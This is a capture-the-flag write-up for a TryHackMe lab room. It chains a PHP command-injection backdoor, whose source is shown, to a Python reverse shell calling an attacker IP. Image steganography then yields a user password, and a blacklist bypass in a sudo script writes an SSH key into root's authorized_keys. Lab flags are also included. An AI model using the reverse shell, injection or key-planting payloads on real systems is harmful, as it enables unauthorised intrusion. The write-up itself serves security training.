---
title: "U.A. High School — Web Exploitation"
description: "TryHackMe writeup: PHP command injection → reverse shell, JPEG/PNG magic-byte steganography (steghide), and SSH authorized_keys privilege escalation."
tags: [Web, CTF, THM, Forensics]
author: Kkhao
date: 2026-11-01
---

# U.A. High School

> TryHackMe room — a web exploitation chain combining a PHP command-injection RCE, image steganography, and SSH-key privilege escalation.
>
> **User flag:** `THM{W3lC0m3_D3kU_1A_0n3f0rAll??}`
> **Root flag:** `THM{Y0U_4r3_7h3_NUm83r_1_H3r0}`

## 1. Enumeration

I started by browsing the web application at `10.48.130.244`. The homepage didn't expose any obviously exploitable input, so I moved on to service scanning and directory brute-forcing.

**Port scan:**
```bash
nmap -sC -sV -T4 -p- 10.48.130.244
```
Output:
```
Nmap scan report for 10.48.130.244
Host is up (0.40s latency).
Not shown: 65494 closed tcp ports (reset), 39 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 71:63:46:4f:bc:54:25:be:7c:77:2c:80:c9:62:47:b2 (RSA)
|   256 e5:35:b4:47:94:82:f6:07:5c:53:c7:8a:52:08:0b:82 (ECDSA)
|_  256 92:1b:b0:9a:59:42:0b:0f:bd:f1:fd:d4:15:a8:dd:b6 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Directory brute-force:**
```bash
gobuster dir -u "http://10.48.130.244/" -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```
Output:
```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.130.244/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
assets               (Status: 301) [Size: 315] [--> http://10.48.130.244/assets/]
```

Only ports 22 and 80 were open, and the only interesting path was `/assets`.

:arrow_forward: This directory looked worth digging into further.

## 2. The `/assets` Directory

> [!WARNING]
> This application keeps its frontend source and images directly under `/assets` at the web root and serves them from there — meaning anything reachable in that folder is effectively public.

### Enumerating `/assets`

I re-ran `gobuster`, this time filtering for `.php` files specifically, since a reachable PHP script sitting in a static-assets folder is unusually dangerous:

```bash
gobuster dir -u "http://10.48.130.244/assets/" -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x .php
```
Output:
```
images               (Status: 301) [Size: 322] [--> http://10.48.130.244/assets/images/]
index.php            (Status: 200) [Size: 0]
```

- `/assets/images/` redirected, but its contents weren't browsable without already knowing a filename.
- `/assets/index.php` responded `200 OK` with an **empty body**:

![image](https://hackmd.io/_uploads/BJiutpWaGe.png)

### Finding the command injection

A blank `200` from a `.php` file is a strong hint the script is waiting on a parameter. After trying a few common names, `cmd` turned out to be it.

Source of `index.php` (recovered later from the shell):
```php
<?php
        $value = " ";
        session_start();
        if (isset($_GET['cmd'])){

           $value = shell_exec($_GET['cmd']);
           echo base64_encode( $value);

        }

?>
```

The script runs whatever is passed in `cmd` through `shell_exec()` and base64-encodes the output — a textbook OS command injection via an HTTP GET parameter.

**Testing it:**

![image](https://hackmd.io/_uploads/S1iPi6-aGe.png)

> [!TIP]
> The response is base64-encoded, so it's easiest to decode in Burp Suite (or `base64 -d`). Decoding confirmed the web server process runs as `www-data`.

### Getting an interactive shell

With arbitrary command execution confirmed, the next step was turning it into a proper reverse shell.

**1. Generate the payload** (via [revshells.com](https://www.revshells.com/)) — attacking host `192.168.137.58`, listener port `9001`:
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.137.58",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```
This gets URL-encoded and sent as the `cmd` GET parameter.

**2. Start a listener:**
```bash
nc -lvnp 9001
```

Result:

![image](https://hackmd.io/_uploads/ryjHJCZpfx.png)

With a shell as `www-data`, next step was finding a path to the user and root flags.

## 3. User Flag

First, I upgraded the shell for usability:
```bash
# spawn a full PTY
$ script -c /bin/bash 2>/dev/null
# set a sane terminal
$ export TERM=xterm-256color
```

The target user is `Deku`, so getting `user.txt` meant finding valid SSH credentials for that account.

### Finding a lead

Inside `/var/www/Hidden_Content` there was a `passphrase.txt`:
```bash
www-data@ip-10-48-149-64:/var/www/Hidden_Content$ cat passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==
www-data@ip-10-48-149-64:/var/www/Hidden_Content$ echo QWxsbWlnaHRGb3JFdmVyISEhCg | base64 -d
AllmightForEver!!!
```

> [!NOTE]
> A "passphrase" strongly suggests an encrypted secret. Given this is an image-heavy app, the obvious guess was **steganography** — something embedded in an image and unlocked with `steghide` using this passphrase.

### Pulling the images down

Back in `/assets/images/` — not browsable earlier — there were two files. I served them with Python's HTTP server and fetched them from my attacking machine:

Web shell:
```bash
www-data@ip-10-48-149-64:/var/www/html/assets/images$ ls
oneforall.jpg  yuei.jpg
www-data@ip-10-48-149-64:/var/www/html/assets/images$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.137.58 - - [01/Nov/2026 04:54:15] "GET /oneforall.jpg HTTP/1.1" 200 -
192.168.137.58 - - [01/Nov/2026 04:54:50] "GET /yuei.jpg HTTP/1.1" 200 -
```

Kali:
```bash
┌──(kali㉿kali)-[~/CTF/THM]
└─$ curl http://10.48.149.64:8000/oneforall.jpg -o oneforall.jpg
┌──(kali㉿kali)-[~/CTF/THM]
└─$ curl http://10.48.149.64:8000/yuei.jpg -o yuei.jpg
```

> [!NOTE]
> The target's IP changed between this step (`10.48.149.64`) and the initial scan (`10.48.130.244`) — the TryHackMe machine was restarted/redeployed between sessions, so it picked up a new address. The root section further down uses a third address (`10.48.148.116`) for the same reason; it's the same box each time.

### The magic-byte trick

`exiftool` revealed that `oneforall.jpg` isn't what its extension claims:
```bash
┌──(kali㉿kali)-[~/CTF/THM]
└─$ exiftool oneforall.jpg
File Name                       : oneforall.jpg
File Size                       : 98 kB
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Warning                         : PNG image did not start with IHDR
```

`steghide` — the tool implied by the `passphrase.txt` clue — only supports **JPEG, BMP, WAV and AU** as cover files; it does **not** handle PNG. So the goal isn't to make this a valid PNG — it's the opposite: the file's leading bytes had been swapped to *look* like a (broken) PNG header, specifically to throw off `file`/`exiftool`, while the real JPEG data with the hidden payload was left intact underneath. The fix is to restore the genuine **JPEG/JFIF** signature at the start of the file:

```bash
cp oneforall.jpg oneforall.png
hexeditor -b oneforall.png
```

Patch the first bytes **from** the fake PNG signature **to** the real JPEG/JFIF signature:

| | Bytes |
|---|---|
| Before (fake PNG header) | `89 50 4E 47 0D 0A 1A 0A` |
| After (real JPEG/JFIF header) | `FF D8 FF E0 00 10 4A 46 49 46` |

> [!NOTE]
> `steghide` identifies a cover file by its header bytes, not its extension, so the `.png` name doesn't matter once the header is a valid JPEG signature — it would work renamed back to `.jpg` just as well.

### Extracting the credentials

```bash
┌──(kali㉿kali)-[~/CTF/THM]
└─$ steghide extract -sf oneforall.png
Enter passphrase: AllmightForEver!!!
wrote extracted data to "creds.txt".

┌──(kali㉿kali)-[~/CTF/THM]
└─$ cat creds.txt
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

### Logging in and grabbing the flag

```bash
┌──(kali㉿kali)-[~/CTF/THM]
└─$ ssh deku@10.48.149.64
deku@10.48.149.64's password:
deku@ip-10-48-149-64:~$ cat user.txt
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
```
<!-- TODO: replace with your actual terminal output for this login step -->

**User flag:** `THM{W3lC0m3_D3kU_1A_0n3f0rAll??}`

## 4. Root Flag

### Finding the escalation path

```bash
$ sudo -l
Matching Defaults entries for deku on ip-10-48-149-64:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on ip-10-48-149-64:
    (ALL) /opt/NewComponent/feedback.sh
```

`deku` can run `feedback.sh` as root with no password. Reading the script:

```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input."
fi
```

It reads a line into `$feedback`, blacklists backticks, `)`, `$(`, `|`, `&`, `;`, `?`, `!` and `\`, then runs `eval "echo $feedback"` as root. The blacklist blocks the usual ways to chain a *second* command, but it never blocks `>` or `<` — redirection. That's enough: `echo` doesn't need command substitution to write arbitrary text to a file, just its argument and a `>` target.

### Writing a root SSH key

Plan: paste the contents of a local SSH public key as the "feedback" text, followed by `> /root/.ssh/authorized_keys`, so the resulting `eval "echo <key> > /root/.ssh/authorized_keys"` writes our key into root's authorized_keys file.

**1. Generate a key pair on Kali:**
```bash
┌──(kali㉿kali)-[~/CTF/THM]
└─$ ssh-keygen -t rsa
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
```



**2. Feed the public key into `feedback.sh` on the target**, so it gets written into `/root/.ssh/authorized_keys`:
```bash

$ sudo /opt/NewComponent/feedback.sh
Enter your feedback:
ssh-rsa AAAA...<rest of id_rsa.pub contents>... kali@kali > /root/.ssh/authorized_keys
```
<!-- TODO: confirm this matches the exact payload you entered — cross-check against your screenshot below -->

![image](https://hackmd.io/_uploads/Sk92mI4pfx.png)

**3. Lock down the private key and connect as root:**
```bash
chmod 600 id_rsa
```
```bash
┌──(kali㉿kali)-[~/CTF/THM]
└─$ ssh -i id_rsa root@10.48.148.116
Last login: Sun May 11 19:28:03 2025 from 10.23.8.228
root@ip-10-48-148-116:~#
```


```bash
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
```


**Root flag:** `THM{Y0U_4r3_7h3_NUm83r_1_H3r0}`

## Summary

| Stage | Technique |
|---|---|
| Initial access | OS command injection via `cmd` GET parameter in `index.php` → reverse shell as `www-data` |
| Lateral movement | Base64-encoded passphrase → steganography (`steghide`) on a JPEG disguised with fake PNG magic bytes → `deku`'s SSH password |
| Privilege escalation | Blacklist bypass (`>` not filtered) in `feedback.sh` → wrote attacker's SSH key into `/root/.ssh/authorized_keys` → root shell |

**User flag:** `THM{W3lC0m3_D3kU_1A_0n3f0rAll??}`
**Root flag:** `THM{Y0U_4r3_7h3_NUm83r_1_H3r0}`

**Author:** [@Kkhao](https://github.com/Kkhao)
**Solved:** 01/11/2026

---

> Images are currently linked from hackmd.io. For a fully self-contained GitHub repo, download them and reference a local path instead (e.g. `./images/oneforall-blank-response.png`).
